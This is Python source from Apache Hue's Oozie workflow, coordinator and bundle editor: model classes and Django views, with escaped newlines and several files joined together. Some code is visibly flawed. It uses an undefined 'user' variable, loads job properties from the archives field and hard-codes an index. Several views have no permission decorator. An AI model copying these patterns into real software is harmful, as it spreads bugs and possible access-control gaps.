match.group('braced')\n        if name is not None:\n          params.append(name)\n\n  return params\n\ndef find_json_parameters(fields):\n  # Input is list of json dict\n  params = []\n\n  for field in fields:\n    for data in field.values():\n      if isinstance(data, basestring):\n        for match in Template.pattern.finditer(data):\n          name = match.group('braced')\n          if name is not None:\n            params.append(name)\n\n  return params\n\ndef find_dollar_variables(text):\n  return re.findall('[^\\n\\\\\\\\]\\$([^\\{ \\'\\\"\\-;\\(\\)]+)', text, re.MULTILINE)  \n\ndef find_dollar_braced_variables(text):\n  vars = set()\n  \n  for var in re.findall('\\$\\{(.+)\\}', text, re.MULTILINE):  \n    if ':' in var:\n      var = var.split(':', 1)[1]    \n    vars.add(var)\n  \n  return list(vars) \n\n\n\n\ndef import_workflows_from_hue_3_7():\n  return import_workflow_from_hue_3_7(OldWorflows.objects.filter(managed=True).filter(is_trashed=False)[12].get_full_node())\n\n\ndef import_workflow_from_hue_3_7(old_wf):\n  \"\"\"\n  Example of data to transform\n\n  [<Start: start>, <Pig: Pig>, [<Kill: kill>], [<End: end>]]\n  [<Start: start>, <Java: TeraGenWorkflow>, <Java: TeraSort>, [<Kill: kill>], [<End: end>]]\n  [<Start: start>, [<Fork: fork-34>, [[<Mapreduce: Sleep-1>, <Mapreduce: Sleep-10>], [<Mapreduce: Sleep-5>, [<Fork: fork-38>, [[<Mapreduce: Sleep-3>], [<Mapreduce: Sleep-4>]], <Join: join-39>]]], <Join: join-35>], [<Kill: kill>], [<End: end>]]\n  \"\"\"\n  \n  uuids = {}\n\n  old_nodes = old_wf.get_hierarchy()\n  \n  wf = Workflow()\n  wf_rows = []\n  wf_nodes = []\n  \n  data = wf.get_data()\n  \n  # UUIDs node mapping\n  for node in old_wf.node_list:    \n    if node.name == 'kill':\n      node_uuid = '17c9c895-5a16-7443-bb81-f34b30b21548'\n    elif node.name == 'start':\n      node_uuid = '3f107997-04cc-8733-60a9-a4bb62cebffc'\n    elif node.name == 'end':\n      node_uuid = '33430f0f-ebfa-c3ec-f237-3e77efa03d0a'\n    else:\n      node_uuid = str(uuid.uuid4())\n\n    uuids[node.id] = node_uuid\n    \n  # Workflow\n  data['workflow']['uuid'] = str(uuid.uuid4())\n  data['workflow']['name'] = old_wf.name\n  data['workflow']['properties']['properties'] = json.loads(old_wf.job_properties)\n  data['workflow']['properties']['job_xml'] = old_wf.job_xml\n  data['workflow']['properties']['description'] = old_wf.description\n  data['workflow']['properties']['schema_version'] = old_wf.schema_version\n  data['workflow']['properties']['deployment_dir'] = old_wf.deployment_dir\n  data['workflow']['properties']['parameters'] = json.loads(old_wf.parameters)\n  data['workflow']['properties']['description'] = old_wf.description\n  data['workflow']['properties']['sla'] = old_wf.sla\n  data['workflow']['properties']['sla_enabled'] = old_wf.sla_enabled\n      \n  # Layout\n  rows = data['layout'][0]['rows']\n  \n  def _create_layout(nodes, size=12):\n    wf_rows = []\n    \n    for node in nodes:      \n      if type(node) == list and len(node) == 1:\n        node = node[0]\n      if type(node) != list:\n        if node.node_type != 'kill': # No kill widget displayed yet\n          wf_rows.append({\"widgets\":[{\"size\":size, \"name\": node.name.title(), \"id\":  uuids[node.id], \"widgetType\": \"%s-widget\" % node.node_type, \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span%s\" % size, \"columns\":[]}]})\n      else:\n        if node[0].node_type == 'fork':\n          wf_rows.append({\"widgets\":[{\"size\":size, \"name\": 'Fork', \"id\":  uuids[node[0].id], \"widgetType\": \"%s-widget\" % node[0].node_type, \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span%s\" % size, \"columns\":[]}]})  \n          \n          wf_rows.append({  \n            \"id\": str(uuid.uuid4()),\n            \"widgets\":[  \n\n            ],\n            \"columns\":[  \n               {  \n                  \"id\": str(uuid.uuid4()),\n                  \"size\": (size / len(node[1])),\n                  \"rows\": \n                     [{  \n                        \"id\": str(uuid.uuid4()),\n                        \"widgets\": c['widgets'],\n                        \"columns\":[]\n                      } \n                    for c in col] if type(col) == list else [{  \n                        \"id\": str(uuid.uuid4()),\n                        \"widgets\": col['widgets'],\n                        \"columns\":[]\n                      }\n                   ] \n                  ,                  \n                  \"klass\":\"card card-home card-column span%s\" % (size / len(node[1]))\n               }\n               for col in _create_layout(node[1], size)\n            ]\n          })\n          \n          wf_rows.append({\"widgets\":[{\"size\":size, \"name\": 'Join', \"id\":  uuids[node[2].id], \"widgetType\": \"%s-widget\" % node[2].node_type, \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span%s\" % size, \"columns\":[]}]})\n        else:\n          wf_rows.append(_create_layout(node, size))\n    \n    return wf_rows\n  \n  wf_rows = _create_layout(old_nodes[1:-1])\n    \n  if wf_rows:\n    data['layout'][0]['rows'] = [data['layout'][0]['rows'][0]] + wf_rows + [data['layout'][0]['rows'][-1]]\n\n\n  # Content\n  def _dig_nodes(nodes):\n    for node in nodes:\n      if type(node) != list:\n        properties = {}\n        if '%s-widget' % node.node_type in NODES and node.node_type != 'kill-widget':\n          properties = dict(NODES['%s-widget' % node.node_type].get_fields())\n        \n        if node.node_type == 'pig-widget':\n          properties['script_path'] = node.script_path\n          properties['params'] = json.loads(node.params)\n          properties['files'] = json.loads(node.files)\n          properties['archives'] = json.loads(node.archives)\n          properties['job_properties'] = json.loads(node.archives)          \n          properties['prepares'] = json.loads(node.prepares)\n          properties['job_xml'] = node.job_xml\n          properties['description'] = node.description\n          properties['sla'] = node.sla\n          properties['sla_enabled'] = node.sla_enabled\n\n        wf_nodes.append({\n            \"id\": uuids[node.id],\n            \"name\": '%s-%s' % (node.node_type.split('-')[0], uuids[node.id][:4]),\n            \"type\": \"%s-widget\" % node.node_type,\n            \"properties\": properties,\n            \"children\":[{('to' if link.name in ('ok', 'start') else link.name): uuids[link.child.get_full_node().id]} for link in node.get_children_links()]\n        })\n      else:\n        _dig_nodes(node)\n\n  _dig_nodes(old_nodes)\n  \n  data['workflow']['nodes'] = wf_nodes\n\n  return Workflow(data=json.dumps(data))\n\n\n\nclass Coordinator(Job):\n  XML_FILE_NAME = 'coordinator.xml'\n  PROPERTY_APP_PATH = 'oozie.coord.application.path'\n  HUE_ID = 'hue-id-c'\n\n  def __init__(self, data=None, json_data=None, document=None):\n    self.document = document\n\n    if document is not None:\n      self._data = json.loads(document.data)\n    elif json_data is not None:\n      self._data = json.loads(json_data)\n    elif data is not None:\n      self._data = data\n    else:\n      self._data = {\n          'id': None, \n          'uuid': None,\n          'name': 'My Coordinator',\n          'variables': [],\n          'properties': {\n              'deployment_dir': '',\n              'schema_version': 'uri:oozie:coordinator:0.2',\n              'frequency_number': 1,\n              'frequency_unit': 'days',\n              'cron_frequency': '0 0 * * *',\n              'cron_advanced': False,\n              'timezone': 'America/Los_Angeles',\n              'start': datetime.today(),\n              'end': datetime.today() + timedelta(days=3),\n              'workflow': None,\n              'timeout': None,\n              'concurrency': None,\n              'execution': None,\n              'throttle': None,\n              'job_xml': '',\n              'sla_enabled': False,\n              'sla_workflow_enabled': False,\n              'credentials': [],\n              'parameters': [{'name': 'oozie.use.system.libpath', 'value': True}],\n              'properties': [], # Aka workflow parameters\n              'sla': Workflow.SLA_DEFAULT\n          }\n      }\n\n  @property\n  def id(self):\n    return self.document.id\n\n  @property\n  def uuid(self):\n    return self.document.uuid\n\n  def json_for_html(self):\n    _data = self.data.copy()\n\n    _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n    _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n\n    return json.dumps(_data, cls=JSONEncoderForHTML)\n \n  @property\n  def data(self):\n    if type(self._data['properties']['start']) == unicode:\n      self._data['properties']['start'] = parse(self._data['properties']['start'])\n      \n    if type(self._data['properties']['end']) == unicode:\n      self._data['properties']['end'] = parse(self._data['properties']['end'])    \n\n    if self.document is not None:\n      self._data['id'] = self.document.id\n\n    return self._data\n  \n  @property\n  def name(self):\n    return self.data['name']\n\n  @property      \n  def deployment_dir(self):\n    if not self.data['properties'].get('deployment_dir'):\n      self.data['properties']['deployment_dir'] = Job.get_workspace(user)    \n    return self.data['properties']['deployment_dir']\n  \n  def find_parameters(self):\n    params = set()\n\n    if self.sla_enabled:\n      for param in find_json_parameters(self.sla):\n        params.add(param)\n\n# get missed params from wf\n\n#    for prop in self.workflow.get_parameters():\n#      if not prop['name'] in index:\n#        props.append(prop)\n#        index.append(prop['name'])\n#\n#    # Remove DataInputs and DataOutputs\n#    datainput_names = [_input.name for _input in self.datainput_set.all()]\n#    dataoutput_names = [_output.name for _output in self.dataoutput_set.all()]\n#    removable_names = datainput_names + dataoutput_names\n#    props = filter(lambda prop: prop['name'] not in removable_names, props)\n\n# get $params in wf properties\n# [{'name': parameter['workflow_variable'], 'value': parameter['dataset_variable']} for parameter in self.data['variables'] if parameter['dataset_type'] == 'parameter']\n\n    return dict([(param, '') for param in list(params)])\n  \n  @property      \n  def sla_enabled(self):\n    return self.data['properties']['sla_enabled']\n\n  @property      \n  def sla(self):\n    return self.data['properties']['sla']\n  \n  @property      \n  def parameters(self):\n    return self.data['properties']['parameters']\n  \n  @property\n  def datasets(self):\n    return self.inputDatasets + self.outputDatasets\n  \n  @property\n  def inputDatasets(self):    \n    return [Dataset(dataset) for dataset in self.data['variables'] if dataset['dataset_type'] == 'input_path']\n    \n  @property\n  def outputDatasets(self):\n    return [Dataset(dataset) for dataset in self.data['variables'] if dataset['dataset_type'] == 'output_path']\n\n  @property\n  def start_utc(self):\n    return utc_datetime_format(self.data['properties']['start'])\n\n  @property\n  def end_utc(self):\n    return utc_datetime_format(self.data['properties']['end'])\n\n  @property\n  def frequency(self):\n    return '${coord:%(unit)s(%(number)d)}' % {'unit': self.data['properties']['frequency_unit'], 'number': self.data['properties']['frequency_number']}\n\n  @property\n  def cron_frequency(self):\n    data_dict = self.data['properties']\n    \n    if 'cron_frequency' in data_dict:\n      return data_dict['cron_frequency']\n    else:\n      # Backward compatibility\n      freq = '0 0 * * *'\n      if data_dict['frequency_number'] == 1:\n        if data_dict['frequency_number'] == 'MINUTES':\n          freq = '* * * * *'\n        elif data_dict['frequency_number'] == 'HOURS':\n          freq = '0 * * * *'\n        elif data_dict['frequency_number'] == 'DAYS':\n          freq = '0 0 * * *'\n        elif data_dict['frequency_number'] == 'MONTH':\n          freq = '0 0 * * *'\n      return {'frequency': freq, 'isAdvancedCron': False}\n\n  def to_xml(self, mapping=None):\n    if mapping is None:\n      mapping = {}\n\n    tmpl = \"editor/gen2/coordinator.xml.mako\"\n    return re.sub(re.compile('\\s*\\n+', re.MULTILINE), '\\n', django_mako.render_to_string(tmpl, {'coord': self, 'mapping': mapping})).encode('utf-8', 'xmlcharrefreplace') \n  \n  @property\n  def properties(self):    \n    props = [{'name': dataset['workflow_variable'], 'value': dataset['dataset_variable']} for dataset in self.data['variables'] if dataset['dataset_type'] == 'parameter']\n    props += self.data['properties']['properties']\n    return props\n\n\nclass Dataset():\n\n  def __init__(self, data):\n    self._data = data\n\n  @property\n  def data(self):\n    if type(self._data['start']) == unicode: \n      self._data['start'] = parse(self._data['start'])\n\n    self._data['name'] = self._data['workflow_variable']\n\n    return self._data      \n      \n  @property\n  def frequency(self):\n    return '${coord:%(unit)s(%(number)d)}' % {'unit': self.data['frequency_unit'], 'number': self.data['frequency_number']}\n      \n  @property\n  def start_utc(self):\n    return utc_datetime_format(self.data['start'])\n\n  @property\n  def start_instance(self):\n    if not self.is_advanced_start_instance:\n      return int(self.data['advanced_start_instance'])\n    else:\n      return 0\n\n  @property\n  def is_advanced_start_instance(self):\n    return not self.is_int(self.data['advanced_start_instance'])\n\n  def is_int(self, text):\n    try:\n      int(text)\n      return True\n    except ValueError:\n      return False\n\n  @property\n  def end_instance(self):\n    if not self.is_advanced_end_instance:\n      return int(self.data['advanced_end_instance'])\n    else:\n      return 0\n\n  @property\n  def is_advanced_end_instance(self):\n    return not self.is_int(self.data['advanced_end_instance'])\n\n\n\nclass Bundle(Job):\n  XML_FILE_NAME = 'bundle.xml'\n  PROPERTY_APP_PATH = 'oozie.bundle.application.path'\n  HUE_ID = 'hue-id-b'\n\n  def __init__(self, data=None, json_data=None, document=None):\n    self.document = document\n\n    if document is not None:\n      self._data = json.loads(document.data)\n    elif json_data is not None:\n      self._data = json.loads(json_data)\n    elif data is not None:\n      self._data = data\n    else:\n      self._data = {\n          'id': None, \n          'uuid': None,\n          'name': 'My Bundle',\n          'coordinators': [],\n          'properties': {\n              'deployment_dir': '',\n              'schema_version': 'uri:oozie:bundle:0.2',\n              'kickoff': datetime.today(),\n              'parameters': [{'name': 'oozie.use.system.libpath', 'value': True}]\n          }\n      }\n\n  @property\n  def id(self):\n    return self.document.id\n\n  @property\n  def uuid(self):\n    return self.document.uuid\n\n  def json_for_html(self):\n    _data = self.data.copy()\n\n    _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n\n    return json.dumps(_data, cls=JSONEncoderForHTML)\n \n  @property\n  def data(self):\n    if type(self._data['properties']['kickoff']) == unicode:\n      self._data['properties']['kickoff'] = parse(self._data['properties']['kickoff'])\n\n    if self.document is not None:\n      self._data['id'] = self.document.id\n\n    return self._data\n \n  def to_xml(self, mapping=None):\n    if mapping is None:\n      mapping = {}\n\n    mapping.update(dict(list(Document2.objects.filter(type='oozie-coordinator2', uuid__in=self.data['coordinators']).values('uuid', 'name'))))\n    tmpl = \"editor/gen2/bundle.xml.mako\"\n    return force_unicode(\n              re.sub(re.compile('\\s*\\n+', re.MULTILINE), '\\n', django_mako.render_to_string(tmpl, {\n                'bundle': self,\n                'mapping': mapping\n           })))\n  \n  \n  @property      \n  def name(self):\n    return self.data['name']\n  \n  @property      \n  def parameters(self):\n    return self.data['properties']['parameters']  \n  \n  @property\n  def kick_off_time_utc(self):\n    return utc_datetime_format(self.data['properties']['kickoff'])  \n  \n  @property      \n  def deployment_dir(self):\n    if not self.data['properties'].get('deployment_dir'):\n      self.data['properties']['deployment_dir'] = Job.get_workspace(user)    \n    return self.data['properties']['deployment_dir']\n  \n  def find_parameters(self):\n    return {}\n/n/n/napps/oozie/src/oozie/views/editor2.py/n/n#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport uuid\n\nfrom django.core.urlresolvers import reverse\nfrom django.forms.formsets import formset_factory\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib.django_util import render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.lib.i18n import smart_str\nfrom desktop.lib.rest.http_client import RestException\nfrom desktop.lib.json_utils import JSONEncoderForHTML\nfrom desktop.models import Document, Document2\n\nfrom liboozie.credentials import Credentials\nfrom liboozie.oozie_api import get_oozie\nfrom liboozie.submission2 import Submission\n\nfrom oozie.decorators import check_document_access_permission, check_document_modify_permission\nfrom oozie.forms import ParameterForm\nfrom oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\\n    find_dollar_variables, find_dollar_braced_variables\n\n\nLOG = logging.getLogger(__name__)\n\n\n\ndef list_editor_workflows(request):  \n  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  return render('editor/list_editor_workflows.mako', request, {\n      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n  })\n\n\n@check_document_access_permission()\ndef edit_workflow(request):\n  workflow_id = request.GET.get('workflow')\n  \n  if workflow_id:\n    wid = {}\n    if workflow_id.isdigit():\n      wid['id'] = workflow_id\n    else:\n      wid['uuid'] = workflow_id\n    doc = Document2.objects.get(type='oozie-workflow2', **wid)\n    workflow = Workflow(document=doc)\n  else:\n    doc = None\n    workflow = Workflow()\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n  \n  workflow_data = workflow.get_data()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  return render('editor/workflow_editor.mako', request, {\n      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_workflow(request):\n  return edit_workflow(request)\n\n\ndef delete_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(id=job['id'])\n    doc = doc2.doc.get()\n    doc.can_write_or_exception(request.user)\n    \n    doc.delete()\n    doc2.delete()\n\n  response = {}\n  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef copy_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])\n    \n    name = doc2.name + '-copy'\n    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)\n  \n    doc2.pk = None\n    doc2.id = None\n    doc2.uuid = str(uuid.uuid4())\n    doc2.name = name\n    doc2.owner = request.user    \n    doc2.save()\n  \n    doc2.doc.all().delete()\n    doc2.doc.add(copy_doc)\n    \n    workflow = Workflow(document=doc2)\n    workflow.update_name(name)\n    doc2.update_data({'workflow': workflow.get_data()['workflow']})\n    doc2.save()\n\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n\n  response = {}  \n  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_modify_permission()\ndef save_workflow(request):\n  response = {'status': -1}\n\n  workflow = json.loads(request.POST.get('workflow', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  if workflow.get('id'):\n    workflow_doc = Document2.objects.get(id=workflow['id'])\n  else:      \n    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)\n    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')\n\n  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']\n  if subworkflows:\n    dependencies = Document2.objects.filter(uuid__in=subworkflows)\n    workflow_doc.dependencies = dependencies\n\n  workflow_doc.update_data({'workflow': workflow})\n  workflow_doc.update_data({'layout': layout})\n  workflow_doc.name = workflow['name']\n  workflow_doc.save()\n  \n  workflow_instance = Workflow(document=workflow_doc)\n  \n  response['status'] = 0\n  response['id'] = workflow_doc.id\n  response['doc1_id'] = workflow_doc.doc.get().id\n  response['message'] = _('Page saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef new_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n\n  properties = NODES[node['widgetType']].get_mandatory_fields()\n  workflows = []\n\n  if node['widgetType'] == 'subworkflow-widget':\n    workflows = _get_workflows(request.user)\n\n  response['status'] = 0\n  response['properties'] = properties \n  response['workflows'] = workflows\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef _get_workflows(user):\n  return [{\n        'name': workflow.name,\n        'owner': workflow.owner.username,\n        'value': workflow.uuid,\n        'id': workflow.id\n      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]\n    ]  \n\n\ndef add_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n  properties = json.loads(request.POST.get('properties', '{}'))\n  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))\n\n  _properties = dict(NODES[node['widgetType']].get_fields())\n  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))\n\n  if copied_properties:\n    _properties.update(copied_properties)\n\n  response['status'] = 0\n  response['properties'] = _properties\n  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef action_parameters(request):\n  response = {'status': -1}\n  parameters = set()\n\n  try:\n    node_data = json.loads(request.POST.get('node', '{}'))\n    \n    parameters = parameters.union(set(Node(node_data).find_parameters()))\n    \n    script_path = node_data.get('properties', {}).get('script_path', {})\n    if script_path:\n      script_path = script_path.replace('hdfs://', '')\n\n      if request.fs.do_as_user(request.user, request.fs.exists, script_path):\n        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  \n\n        if node_data['type'] in ('hive', 'hive2'):\n          parameters = parameters.union(set(find_dollar_braced_variables(data)))\n        elif node_data['type'] == 'pig':\n          parameters = parameters.union(set(find_dollar_variables(data)))\n                \n    response['status'] = 0\n    response['parameters'] = list(parameters)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef workflow_parameters(request):\n  response = {'status': -1}\n\n  try:\n    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) \n\n    response['status'] = 0\n    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_workflow(request):\n  response = {'status': -1}\n\n  try:\n    workflow_json = json.loads(request.POST.get('workflow', '{}'))\n  \n    workflow = Workflow(workflow=workflow_json)\n  \n    response['status'] = 0\n    response['xml'] = workflow.to_xml()\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_workflow(request, doc_id):\n  workflow = Workflow(document=Document2.objects.get(id=doc_id))\n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)    \n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n\n      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)\n\n      request.info(_('Workflow submitted'))\n      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = workflow.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n    popup = render('editor/submit_job_popup.mako', request, {\n                     'params_form': params_form,\n                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})\n                   }, force_template=True).content\n    return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_workflow(user, fs, jt, workflow, mapping):\n  try:\n    submission = Submission(user, workflow, fs, jt, mapping)\n    job_id = submission.run()\n    return job_id\n  except RestException, ex:\n    detail = ex._headers.get('oozie-error-message', ex)\n    if 'Max retries exceeded with url' in str(detail):\n      detail = '%s: %s' % (_('The Oozie server is not running'), detail)\n    LOG.error(smart_str(detail))\n    raise PopupException(_(\"Error submitting workflow %s\") % (workflow,), detail=detail)\n\n  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n\n\n\ndef list_editor_coordinators(request):\n  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/list_editor_coordinators.mako', request, {\n      'coordinators': coordinators\n  })\n\n\n@check_document_access_permission()\ndef edit_coordinator(request):\n  coordinator_id = request.GET.get('coordinator')\n  doc = None\n  \n  if coordinator_id:\n    doc = Document2.objects.get(id=coordinator_id)\n    coordinator = Coordinator(document=doc)\n  else:\n    coordinator = Coordinator()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):\n    raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n\n  return render('editor/coordinator_editor.mako', request, {\n      'coordinator_json': coordinator.json_for_html(),\n      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_coordinator(request):\n  return edit_coordinator(request)\n\n\n@check_document_modify_permission()\ndef save_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))\n\n  if coordinator_data.get('id'):\n    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])\n  else:      \n    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)\n    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')\n\n  if coordinator_data['properties']['workflow']:\n    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)\n    coordinator_doc.dependencies = dependencies\n\n  coordinator_doc.update_data(coordinator_data)\n  coordinator_doc.name = coordinator_data['name']\n  coordinator_doc.save()\n  \n  response['status'] = 0\n  response['id'] = coordinator_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))\n\n  coordinator = Coordinator(data=coordinator_dict)\n\n  response['status'] = 0\n  response['xml'] = coordinator.to_xml()\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\") \n\n\n@check_document_access_permission()\ndef submit_coordinator(request, doc_id):\n  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_coordinator(request, coordinator, mapping)\n\n      request.info(_('Coordinator submitted.'))\n      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = coordinator.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_coordinator(request, coordinator, mapping):\n  try:\n    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])\n    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()\n\n    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}\n    properties.update(mapping)\n\n    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting coordinator %s\") % (coordinator,),\n                         detail=ex._headers.get('oozie-error-message', ex))\n    \n    \n    \n\ndef list_editor_bundles(request):\n  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]\n\n  return render('editor/list_editor_bundles.mako', request, {\n      'bundles': bundles\n  })\n\n\n@check_document_access_permission()\ndef edit_bundle(request):\n  bundle_id = request.GET.get('bundle')\n  doc = None\n  \n  if bundle_id:\n    doc = Document2.objects.get(id=bundle_id)\n    bundle = Bundle(document=doc)\n  else:\n    bundle = Bundle()\n\n  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/bundle_editor.mako', request, {\n      'bundle_json': bundle.json_for_html(),\n      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n      'doc1_id': 